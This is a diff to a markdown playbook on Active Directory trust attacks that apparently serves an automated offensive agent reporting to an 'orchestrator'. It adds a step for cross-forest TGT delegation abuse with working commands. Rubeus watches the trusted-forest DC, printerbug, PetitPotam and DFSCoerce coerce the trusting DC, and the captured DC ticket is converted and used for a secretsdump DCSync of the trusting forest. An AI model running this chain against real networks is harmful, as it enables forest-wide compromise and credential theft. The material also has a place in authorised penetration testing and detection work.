@@ -5,9 +5,11 @@ description: >
   cross-domain and cross-forest privilege escalation. Covers trust enumeration
   (nltest, PowerView, BloodHound), SID history injection (child domain to
   forest root via golden/diamond ticket with extra SIDs), inter-realm TGT
-  forging using trust keys, cross-forest trust abuse (SID filtering bypass,
-  RBCD, Kerberoasting via trust account), and PAM trust exploitation (shadow
-  principals in bastion forests).
+  forging using trust keys, TGT delegation coercion capture (Rubeus monitor +
+  SpoolSample/DFSCoerce across forest trusts with ENABLE_TGT_DELEGATION),
+  cross-forest trust abuse (SID filtering bypass, RBCD, Kerberoasting via
+  trust account), and PAM trust exploitation (shadow principals in bastion
+  forests).
 keywords:
   - trust attacks
   - domain trust
@@ -25,15 +27,26 @@ keywords:
   - trust enumeration
   - SID filtering
   - forest root
+  - TGT delegation
+  - ENABLE_TGT_DELEGATION
+  - CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION
+  - unconstrained delegation trust
+  - coercion capture
+  - SpoolSample
+  - ticketConverter
 tools:
   - Mimikatz
   - Rubeus
   - Impacket (ticketer.py
   - raiseChild.py
-  - lookupsid.py)
+  - lookupsid.py
+  - ticketConverter.py)
   - PowerView
   - bloodyAD
   - NetExec
+  - SpoolSample / printerbug.py
+  - DFSCoerce
+  - PetitPotam
 opsec: medium
 ---
 
@@ -140,6 +153,7 @@ Get-NetLocalGroupMember -ComputerName dc.parent.local
 Trust Found
 ├── Parent-Child (in-forest) → SID filtering NOT enforced → Step 2 (SID History)
 ├── Forest Trust
+│   ├── TGTDelegation = True + admin on trusted DC → Step 6 (TGT Delegation Coercion)
 │   ├── SIDFilteringQuarantined = False → Step 2 (SID History cross-forest)
 │   ├── SIDFilteringQuarantined = True → Step 3 (Trust Ticket) or Step 5 (enum only)
 │   └── PAM trust attributes → Step 4 (Shadow Principals)
@@ -373,7 +387,58 @@ nxc ldap TARGET_DC -u 'user' -p 'pass' -d target.local --users
 nxc ldap TARGET_DC -u 'user' -p 'pass' -d target.local --groups
 ```
 
-## Step 6: Escalate or Pivot
+## Step 6: TGT Delegation Coercion Capture (Cross-Forest)
+
+When a forest trust has `TGTDelegation = True` (the `CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION`
+flag), DCs in the trusting forest forward their full TGT when authenticating
+cross-forest to DCs in the trusted forest. DCs have unconstrained delegation
+by default — any DC in the trusted forest can harvest forwarded TGTs.
+
+**Prerequisites**: Admin/SYSTEM on a DC in the **trusted** forest (the forest
+that receives authentication). Forest trust with TGTDelegation enabled.
+
+**See also**: kerberos-delegation Step 2 covers unconstrained delegation TGT
+harvesting in same-domain context. This step applies the same technique
+cross-forest via the trust's TGT delegation flag.
+
+### 1. Monitor for Incoming TGTs (Trusted Forest DC)
+
+```powershell
+# Rubeus — monitor for TGTs arriving via unconstrained delegation
+# Run on the DC in the trusted forest (where you have admin)
+Rubeus.exe monitor /interval:5 /nowrap /filteruser:TRUSTING_DC$
+```
+
+### 2. Coerce the Trusting Forest DC
+
+Trigger the trusting forest DC to authenticate to the trusted forest DC.
+**Critical: use the HOSTNAME of the trusted DC, not its IP.** IP causes NTLM
+fallback which does not trigger TGT forwarding. The hostname forces Kerberos
+authentication, which triggers the TGT delegation.
+
+```bash
+# From any host with domain creds — coerce TRUSTING_DC → TRUSTED_DC
+# Use HOSTNAME for listener (forces Kerberos, triggers TGT forwarding)
+python3 printerbug.py DOMAIN/user@TRUSTING_DC TRUSTED_DC_HOSTNAME
+python3 PetitPotam.py -u user -p 'password' -d DOMAIN TRUSTED_DC_HOSTNAME TRUSTING_DC
+python3 dfscoerce.py -u user -d DOMAIN TRUSTED_DC_HOSTNAME TRUSTING_DC
+```
+
+### 3. Capture and Use Forwarded TGT
+
+Rubeus captures the trusting DC's machine TGT (e.g., `DC01$`). Convert and
+use for DCSync:
+
+```bash
+# Convert .kirbi (base64 from Rubeus) → .ccache
+ticketConverter.py ticket.kirbi ticket.ccache
+export KRB5CCNAME=ticket.ccache
+
+# DCSync the trusting forest with the captured DC machine TGT
+secretsdump.py -k -no-pass TRUSTING_DOMAIN/DC01\$@TRUSTING_DC_FQDN -just-dc
+```
+
+## Step 7: Escalate or Pivot
 
 STOP and return to the orchestrator with:
 - What was achieved (RCE, creds, file read, etc.)
@@ -435,3 +500,4 @@ STOP and return to the orchestrator with:
 | raiseChild.py | High | Full chain (DCSync + ticket + auth) | Automated = fast but loud |
 | PAM shadow principal modification | Medium | 5136 (object modification) | Bastion forest only |
 | Cross-forest RBCD | Medium | S4U2Proxy events (4769) | Requires write access |
+| TGT delegation coercion | Medium | 4624 + coercion RPC (4769 cross-forest) | Requires admin on trusted DC |
